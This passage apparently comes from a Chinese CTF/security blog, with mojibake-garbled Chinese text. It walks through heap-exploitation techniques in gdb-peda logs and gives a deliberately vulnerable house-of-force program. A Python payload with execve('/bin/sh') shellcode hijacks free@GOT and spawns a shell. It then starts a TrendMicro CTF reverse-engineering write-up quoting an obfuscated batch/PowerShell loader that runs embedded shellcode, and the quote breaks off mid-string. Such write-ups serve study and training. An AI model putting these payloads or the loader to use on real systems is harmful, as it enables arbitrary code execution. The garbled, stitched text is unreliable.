--&gt; 0xffffd530 --&gt; 0x0 EIP: 0x804854e (&lt;fvuln+83&gt;: add esp,0x4)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048543 &lt;fvuln+72&gt;: add esp,0x8 0x8048546 &lt;fvuln+75&gt;: push DWORD PTR [ebp-0x8] 0x8048549 &lt;fvuln+78&gt;: call 0x8048390 &lt;free@plt&gt;=&gt; 0x804854e &lt;fvuln+83&gt;: add esp,0x4 0x8048551 &lt;fvuln+86&gt;: push 0x28 0x8048553 &lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x8048558 &lt;fvuln+93&gt;: add esp,0x4 0x804855b &lt;fvuln+96&gt;: mov DWORD PTR [ebp-0xc],eax[------------------------------------stack-------------------------------------]0000| 0xffffd51c --&gt; 0xffffd530 --&gt; 0x0 0004| 0xffffd520 (&quot;aaaaaaaa&quot;)0008| 0xffffd524 (&quot;aaaa&quot;)0012| 0xffffd528 --&gt; 0x0 0016| 0xffffd52c --&gt; 0x31 ('1')0020| 0xffffd530 --&gt; 0x0 0024| 0xffffd534 ('a' &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)0028| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, value0x0804854e 19 free(ptr1);gdb-peda$ ni [----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0x0 ECX: 0xf7fb9000 --&gt; 0x1aedb0 EDX: 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd520 (&quot;aaaaaaaa&quot;)EIP: 0x8048551 (&lt;fvuln+86&gt;: push 0x28)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048546 &lt;fvuln+75&gt;: push DWORD PTR [ebp-0x8] 0x8048549 &lt;fvuln+78&gt;: call 0x8048390 &lt;free@plt&gt; 0x804854e &lt;fvuln+83&gt;: add esp,0x4=&gt; 0x8048551 &lt;fvuln+86&gt;: push 0x28 0x8048553 &lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x8048558 &lt;fvuln+93&gt;: add esp,0x4 0x804855b &lt;fvuln+96&gt;: mov DWORD PTR [ebp-0xc],eax 0x804855e &lt;fvuln+99&gt;: push DWORD PTR [ebp-0x4][------------------------------------stack-------------------------------------]0000| 0xffffd520 (&quot;aaaaaaaa&quot;)0004| 0xffffd524 (&quot;aaaa&quot;)0008| 0xffffd528 --&gt; 0x0 0012| 0xffffd52c --&gt; 0x31 ('1')0016| 0xffffd530 --&gt; 0x0 0020| 0xffffd534 ('a' &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)0024| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)0028| 0xffffd53c (&quot;aaaabbbbcccc&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, value21 ptr2 = (char *) malloc(40);gdb-peda$ ni 123456789101112131415161718192021222324252627282930313233343536[----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0x0 ECX: 0xf7fb9000 --&gt; 0x1aedb0 EDX: 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd51c --&gt; 0x28 ('(')EIP: 0x8048553 (&lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt;)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048549 &lt;fvuln+78&gt;: call 0x8048390 &lt;free@plt&gt; 0x804854e &lt;fvuln+83&gt;: add esp,0x4 0x8048551 &lt;fvuln+86&gt;: push 0x28=&gt; 0x8048553 &lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x8048558 &lt;fvuln+93&gt;: add esp,0x4 0x804855b &lt;fvuln+96&gt;: mov DWORD PTR [ebp-0xc],eax 0x804855e &lt;fvuln+99&gt;: push DWORD PTR [ebp-0x4] 0x8048561 &lt;fvuln+102&gt;: lea eax,[ebp-0x2c]Guessed arguments:arg[0]: 0x28 ('(')[------------------------------------stack-------------------------------------]0000| 0xffffd51c --&gt; 0x28 ('(')0004| 0xffffd520 (&quot;aaaaaaaa&quot;)0008| 0xffffd524 (&quot;aaaa&quot;)0012| 0xffffd528 --&gt; 0x0 0016| 0xffffd52c --&gt; 0x31 ('1')0020| 0xffffd530 --&gt; 0x0 0024| 0xffffd534 ('a' &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)0028| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 4, 0x08048553 in fvuln (str1=0xffffd828 'a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;, age=0x31) at hos.c:2121 ptr2 = (char *) malloc(40);gdb-peda$ ni è¿™é‡Œï¼Œåˆ†é…åˆ°äº†æ ˆä¸Šçš„åœ°å€ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 [----------------------------------registers-----------------------------------]EAX: 0xffffd530 --&gt; 0x0 EBX: 0x0 ECX: 0xf7fb9780 --&gt; 0x0 EDX: 0xffffd530 --&gt; 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd51c --&gt; 0x28 ('(')EIP: 0x8048558 (&lt;fvuln+93&gt;: add esp,0x4)EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x804854e &lt;fvuln+83&gt;: add esp,0x4 0x8048551 &lt;fvuln+86&gt;: push 0x28 0x8048553 &lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt;=&gt; 0x8048558 &lt;fvuln+93&gt;: add esp,0x4 0x804855b &lt;fvuln+96&gt;: mov DWORD PTR [ebp-0xc],eax 0x804855e &lt;fvuln+99&gt;: push DWORD PTR [ebp-0x4] 0x8048561 &lt;fvuln+102&gt;: lea eax,[ebp-0x2c] 0x8048564 &lt;fvuln+105&gt;: push eax[------------------------------------stack-------------------------------------]0000| 0xffffd51c --&gt; 0x28 ('(')0004| 0xffffd520 (&quot;aaaaaaaa&quot;)0008| 0xffffd524 (&quot;aaaa&quot;)0012| 0xffffd528 --&gt; 0x0 0016| 0xffffd52c --&gt; 0x31 ('1')0020| 0xffffd530 --&gt; 0x0 0024| 0xffffd534 ('a' &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)0028| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, value0x08048558 21 ptr2 = (char *) malloc(40);gdb-peda$ ni [----------------------------------registers-----------------------------------]EAX: 0xffffd530 --&gt; 0x0 EBX: 0x0 ECX: 0xf7fb9780 --&gt; 0x0 EDX: 0xffffd530 --&gt; 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd520 (&quot;aaaaaaaa&quot;)EIP: 0x804855b (&lt;fvuln+96&gt;: mov DWORD PTR [ebp-0xc],eax)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048551 &lt;fvuln+86&gt;: push 0x28 0x8048553 &lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x8048558 &lt;fvuln+93&gt;: add esp,0x4=&gt; 0x804855b &lt;fvuln+96&gt;: mov DWORD PTR [ebp-0xc],eax 0x804855e &lt;fvuln+99&gt;: push DWORD PTR [ebp-0x4] 0x8048561 &lt;fvuln+102&gt;: lea eax,[ebp-0x2c] 0x8048564 &lt;fvuln+105&gt;: push eax 0x8048565 &lt;fvuln+106&gt;: push 0x804867f[------------------------------------stack-------------------------------------]0000| 0xffffd520 (&quot;aaaaaaaa&quot;)0004| 0xffffd524 (&quot;aaaa&quot;)0008| 0xffffd528 --&gt; 0x0 0012| 0xffffd52c --&gt; 0x31 ('1')0016| 0xffffd530 --&gt; 0x0 0020| 0xffffd534 ('a' &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)0024| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)0028| 0xffffd53c (&quot;aaaabbbbcccc&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, value0x0804855b 21 ptr2 = (char *) malloc(40);gdb-peda$ 2.hop TBU3.hom TBU4.hofæ§åˆ¶top chunkçš„sizeå­—æ®µï¼Œå†ä¹‹åçš„ä¸¤æ¬¡malloc()ä¹‹åï¼Œåˆ†é…åˆ°æŒ‡å®šçš„ä½ç½®ã€‚ 123456789101112131415161718192021222324252627282930/*House of force vulnerable program. */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt; int main(int argc, char *argv[]){ char *buf1, *buf2, *buf3; if (argc != 4) { printf(&quot;Usage Error\\n&quot;); return; } [1]buf1 = malloc(256); [2]strcpy(buf1, argv[1]); /* Prereq 1 */ [3]buf2 = malloc(strtoul(argv[2], NULL, 16)); /* Prereq 2 */ [4]buf3 = malloc(256); /* Prereq 3 */ [5]strcpy(buf3, argv[3]); /* Prereq 3 */ [6]free(buf3); free(buf2); free(buf1); return 0;}/* free@got entry 0x08049830top 0x0804a108size = ((0x08049830 - 0x8) - 0x0804a108) -0x8 = 0xFFFFF718python -c 'print &quot;A&quot;*260 + &quot;\\xff\\xff\\xff\\xff&quot; +&quot; &quot;+&quot;0xFFFFF718&quot;+&quot; &quot;+&quot;AAAA&quot;' &gt; 1control eip --&gt; 0x41414141*/ gdb logå¦‚ä¸‹åˆ†é…åˆ°äº†free@got 123456789101112131415161718192021222324252627282930313233 [----------------------------------registers-----------------------------------]EAX: 0x8049830 --&gt; 0x8048346 (&lt;free@plt+6&gt;: push 0x0)EBX: 0xffffd340 --&gt; 0x4 ECX: 0xf7fb9780 --&gt; 0x0 EDX: 0x8049830 --&gt; 0x8048346 (&lt;free@plt+6&gt;: push 0x0)ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd328 --&gt; 0x0 ESP: 0xffffd310 --&gt; 0x4 EIP: 0x804853f (&lt;main+148&gt;: mov DWORD PTR [ebp-0xc],eax)EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048532 &lt;main+135&gt;: push 0x100 0x8048537 &lt;main+140&gt;: call 0x8048360 &lt;malloc@plt&gt; 0x804853c &lt;main+145&gt;: add esp,0x10=&gt; 0x804853f &lt;main+148&gt;: mov DWORD PTR [ebp-0xc],eax 0x8048542 &lt;main+151&gt;: mov eax,DWORD PTR [ebx+0x4] 0x8048545 &lt;main+154&gt;: add eax,0xc 0x8048548 &lt;main+157&gt;: mov eax,DWORD PTR [eax] 0x804854a &lt;main+159&gt;: sub esp,0x8[------------------------------------stack-------------------------------------]0000| 0xffffd310 --&gt; 0x4 0004| 0xffffd314 --&gt; 0x804a008 ('A' &lt;repeats 200 times&gt;...)0008| 0xffffd318 --&gt; 0x804a110 --&gt; 0x0 0012| 0xffffd31c --&gt; 0x80485c1 (&lt;__libc_csu_init+33&gt;: lea eax,[ebx-0xf8])0016| 0xffffd320 --&gt; 0xffffd340 --&gt; 0x4 0020| 0xffffd324 --&gt; 0x0 0024| 0xffffd328 --&gt; 0x0 0028| 0xffffd32c --&gt; 0xf7e22637 (&lt;__libc_start_main+247&gt;: add esp,0x10)[------------------------------------------------------------------------------]Legend: code, data, rodata, value0x0804853f 18 buf3 = malloc(256); /* Prereq 3 */gdb-peda$ åˆ°åé¢strcpy()ä¹‹å 123456789101112131415161718192021222324252627 [----------------------------------registers-----------------------------------]EAX: 0x8049830 (&quot;AAAA&quot;)EBX: 0xffffd340 --&gt; 0x4 ECX: 0xffffd722 (&quot;AAAA&quot;)EDX: 0x8049830 (&quot;AAAA&quot;)ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd328 --&gt; 0x0 ESP: 0xffffd2fc --&gt; 0x8048564 (&lt;main+185&gt;: add esp,0x10)EIP: 0x41414141 ('AAAA')EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]Invalid $PC address: 0x41414141[------------------------------------stack-------------------------------------]0000| 0xffffd2fc --&gt; 0x8048564 (&lt;main+185&gt;: add esp,0x10)0004| 0xffffd300 --&gt; 0x8049830 (&quot;AAAA&quot;)0008| 0xffffd304 --&gt; 0xffffd722 (&quot;AAAA&quot;)0012| 0xffffd308 --&gt; 0x10 0016| 0xffffd30c --&gt; 0x80485eb (&lt;__libc_csu_init+75&gt;: add edi,0x1)0020| 0xffffd310 --&gt; 0x4 0024| 0xffffd314 --&gt; 0x804a008 ('A' &lt;repeats 200 times&gt;...)0028| 0xffffd318 --&gt; 0x804a110 --&gt; 0x0 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0x41414141 in ?? ()gdb-peda$ è¯¥å˜ä¸‹payload 123456789shellcode = &quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62&quot;shellcode += &quot;\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0&quot;shellcode += &quot;\\x0b\\xcd\\x80&quot;payload = &quot;&quot;payload += &quot;\\x90&quot;*10 + shellcode + &quot;A&quot;*(260-10-len(shellcode))payload += &quot;\\xff\\xff\\xff\\xff&quot;payload += &quot; &quot; + &quot;0xFFFFF718&quot;payload += &quot; &quot; + &quot;\\x08\\xa0\\x04\\x08&quot;print payload gdb logè¿™è¾¹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071[----------------------------------registers-----------------------------------]EAX: 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 EBX: 0xffffd340 --&gt; 0x4 ECX: 0xffffd721 --&gt; 0x804a008 --&gt; 0x90909090 EDX: 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd328 --&gt; 0x0 ESP: 0xffffd300 --&gt; 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 EIP: 0x804855f (&lt;main+180&gt;: call 0x8048340 &lt;free@plt&gt;)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048556 &lt;main+171&gt;: add esp,0x10 0x8048559 &lt;main+174&gt;: sub esp,0xc 0x804855c &lt;main+177&gt;: push DWORD PTR [ebp-0xc]=&gt; 0x804855f &lt;main+180&gt;: call 0x8048340 &lt;free@plt&gt; 0x8048564 &lt;main+185&gt;: add esp,0x10 0x8048567 &lt;main+188&gt;: sub esp,0xc 0x804856a &lt;main+191&gt;: push DWORD PTR [ebp-0x10] 0x804856d &lt;main+194&gt;: call 0x8048340 &lt;free@plt&gt;Guessed arguments:arg[0]: 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 [------------------------------------stack-------------------------------------]0000| 0xffffd300 --&gt; 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 0004| 0xffffd304 --&gt; 0xffffd721 --&gt; 0x804a008 --&gt; 0x90909090 0008| 0xffffd308 --&gt; 0x10 0012| 0xffffd30c --&gt; 0x80485eb (&lt;__libc_csu_init+75&gt;: add edi,0x1)0016| 0xffffd310 --&gt; 0x4 0020| 0xffffd314 --&gt; 0x804a008 --&gt; 0x90909090 0024| 0xffffd318 --&gt; 0x804a110 --&gt; 0x0 0028| 0xffffd31c --&gt; 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 [------------------------------------------------------------------------------]Legend: code, data, rodata, value0x0804855f 21 free(buf3);gdb-peda$ pdisass 0x8048340Dump of assembler code from 0x8048340 to 0x8048360:: Dump of assembler code from 0x8048340 to 0x8048360: 0x08048340 &lt;free@plt+0&gt;: jmp DWORD PTR ds:0x8049830 0x08048346 &lt;free@plt+6&gt;: push 0x0 0x0804834b &lt;free@plt+11&gt;: jmp 0x8048330 0x08048350 &lt;strcpy@plt+0&gt;: jmp DWORD PTR ds:0x8049834 0x08048356 &lt;strcpy@plt+6&gt;: push 0x8 0x0804835b &lt;strcpy@plt+11&gt;: jmp 0x8048330End of assembler dump.gdb-peda$ pdisass 0x804a008Dump of assembler code from 0x804a008 to 0x804a028:: Dump of assembler code from 0x804a008 to 0x804a028: 0x0804a008: nop 0x0804a009: nop 0x0804a00a: nop 0x0804a00b: nop 0x0804a00c: nop 0x0804a00d: nop 0x0804a00e: nop 0x0804a00f: nop 0x0804a010: nop 0x0804a011: nop 0x0804a012: xor eax,eax 0x0804a014: push eax 0x0804a015: push 0x68732f2f 0x0804a01a: push 0x6e69622f 0x0804a01f: mov ebx,esp 0x0804a021: push eax 0x0804a022: mov edx,esp 0x0804a024: push ebx 0x0804a025: mov ecx,esp 0x0804a027: mov al,0xbEnd of assembler dump.gdb-peda$ cContinuing.process 9711 is executing new program: /bin/dashError in re-setting breakpoint 1: Function &quot;main&quot; not defined.$ 5.hol TBU 6.hoc TBU","link":"/2016/09/16/Malloc-Maleficarum-%E5%A4%8D%E7%9B%98/"},{"title":"TrendMicro CTF 2017 Reverse300","text":"0x00:æ¯”èµ›çš„æ—¶å€™çœ‹äº†è¿™ä¸ªé¢˜ç›®ï¼Œå½“æ—¶è§£ç¼–ç çš„æ—¶å€™å‡ºäº†ç‚¹é—®é¢˜ï¼Œæ²¡è§£å‡ºæ¥ï¼Œåæ¥å‘ç°æ˜¯Powershellæ²¡åˆ†æå¯¹â€¦ 0x01:1234567891011121314151617181920212223242526@echo offset j=Thank_You_For_Joining_TMCTF2017set k=Tested on Win7SP1 32-bit OSset l=2eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JC%j:~1,1%14YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+set m=moAsSAMOY%02maCkAOwBsdf%smadfdf9z///+qamogG8AZABSDGsaSSwhmzWMOYsA+/masdgmoKYqWTAGEAaQBuAC4ARAB//IAbA==set n=LABNAmaodSDGASJOIHGI76msdm%ls:1qwerATSAYUDBGOSSnsAMIOLM//sogs+AuAFasgqQQYYHAFAZ2%:~QBtAGIAbABdABEA+set o=JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////2hyb1ggaGRNaWNoVHJlbjHbiFwkConjaCF9WCBoZ2FpbmhzTWVBaCFJdEloaGVyZWhsbG9UaEZ7SGVoVE1DVDHJiEwkHonhMdJSU1FS/9AxwFD/VQg=set p=GUAZQBwACgAOQAwACkAOwBGOALAHIAeQB7AGYAdQBuAGMAdABpAG8AbgAgAGcAZABlAGwAZQBnAGEAdABlAHsAUABhAHIAYQBtACAAKABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQBGOALAGkAbwBuADGOALAMAAsAEGOALAYQBuAGQAYQBGOALAG8AcgB5ADGOALAJABUAHIAdQBlACkAXQAgAFsAVAB5AHAAZQBbAFGOALAXQAgACQAUABhAHIAYQBtAGUAdABlAHIAcwAsAFsAUABhAHIAYQBtAGUAdABlAHIAKABQAG8AcwBpAHQAaQBvAG4APQAxACkAXQAgAFsAVAB5AHAAZQBdACAAJABSAGUAdAB1AHIAbgBUAHkAcABlADGOALAWwBWAG8AaQBkAFGOALAKQA7ACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByADGOALAWwBBAHAAcABEAG8AbQBhAGkAbgBdADoAOgBDAHUAcgByAGUAbgBGOALAEQAbwBtAGEAaQBuAC4ARABlAGYAaQBuAGUARAB5AG4AYQBtAGkAYwBBAHMAcwBlAGGOALAYgBsAHkAKAAoAE4AZQB3ACGOALATwBiAGoAZQBjAHQAIABTAHkAcwBGOALAGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAGGOALAYgBsAHkATgBhAGGOALAZQAoACIAUgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlACIAKQApACwAWwBTAHkAcwBGOALAGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBFAGGOALAaQBGOALAC4AQQBzAHMAZQBtAGIAbAB5AEIAdQBpAGwAZABlAHIAQQBjAGMAZQBzAHMAXQA6ADoAUgB1AG4AKQAuAEQAZQBmAGkAbgBlAEQAeQBuAGEAbQBpAGMATQBvAGQAdQBsAGUAKAAiAEkAbgBNAGUAbQBvAHIAeQBNAG8AZAB1AGwAZQAiACwAJABmAGEAbABzAGUAKQAuAEQAZQBmAGkAbgBlAFQAeQBwAGUAKAAiAFgAWABYACIALAAiAEMAbABhAHMAcwAsAFAAdQBiAGwAaQBjACwAUwBlAGEAbABlAGQALABBAG4Acw^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%0gBSAHUAbgBGOALAGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBIAGEAbgBkAGwAZQBSAGUAZgBdACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAGGOALAZQAuAEkAbgBGOALAGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKAAoAE4AZQB3ACGOALATwBiAGoAZQBjAHQAIABJAG4AdABQAHQAcgApACwAJABVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAC4ARwBlAHQATQBlAHQAaABvAGQAKAAiAEcAZQBGOALAEGOALAbwBkAHUAbABlAEgAYQBuAGQAbABlACIAKQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoACQATQBvAGQAdQBsAGUAKQApACkAKQAsACQAUAByAG8AYwBlAGQAdQByAGUAKQApADsAfQBbAEIAeQBGOALAGUAWwBdAFGOALAJABzAGMAMwAyACAAPQAgAFsAUwB5AHMAdABlAGGOALALgBDAG8AbgB2AGUAcgBGOALAFGOALAOgA6AEYAcgBvAGGOALAQgBhAHMAZQA2ADQAUwBGOALAHIAaQBuAGcAKAAkAGUAbgB2ADoAbAArACQAZQBuAHYAOgBPACkAOwAkAGEAPQBHAGUAdAAtAEQAYQBGOALAGUAOwBpAGYAKAAkAGEALgBNAG8AbgBGOALAGgAIAAtAGcAZQAgADIAKQB7AGUAeABpAHQAOwB9AFsAVQBpAG4AdAAzADIAWwBdAFGOALAIAAkAG8AcAA9ADAAOwAkAHIAPQAoAFsAUwB5AHMAdABlAGGOALALgBSAHUAbgBGOALAGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAFGOALAOgA6AEcAZQBGOALAEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgBGOALAGUAcgAoACgAZwBwAHIAbwBjACAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIABWAGkAcgBGOALAHUAYQBsAFAAcgBvAHQAZQBjAHQAKQAsACgAZwBkAGUAbABlAGcAYQBGOALAGUAIABAACgAWwBCAHkAdABlAFsAXQBdACwAWwBVAEkAbgBGOALADMAMgBdACwAWwBVAEkAbgBGOALADMAMgBdACwAWwBVAEkAbgBGOALADMAMgBbAFGOALAXQApACAAKABbAEkAbgBGOALAFAAdAByAFGOALAKQApACkAKQAuAEkAbgB2AG8AawBlACgAJABzAGMAMwAyACwAJABzAGMAMwAyAC4ATABlAG4AZwBGOALAGgALAAwAHgANAAwACwAJABvAHAAKQA7AGkAZgAoACQAcgAgACGOALAZQBxACAAMAApAHsAJABwAHIAPQAoAFsAUwB5AHMAdABlAGGOALALgBSAHUAbgBGOALAGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAFGOALAOgA6AEcAZQBGOALAEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgBGOALAGUAcgAoACgAZwBwAHIAbwBjACAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIABWAGkAcgBGOALAHUAYQBsAEEAbABsAG8AYwApACwAKABnAGQAZQBsAGUAZwBhAHQAZQAgAEAAKABbAEkAbgBGOALAFAAdAByAFGOALALABbAFUASQBuAHQAMwAyAFGOALALABbAFUASQBuAHQAMwAy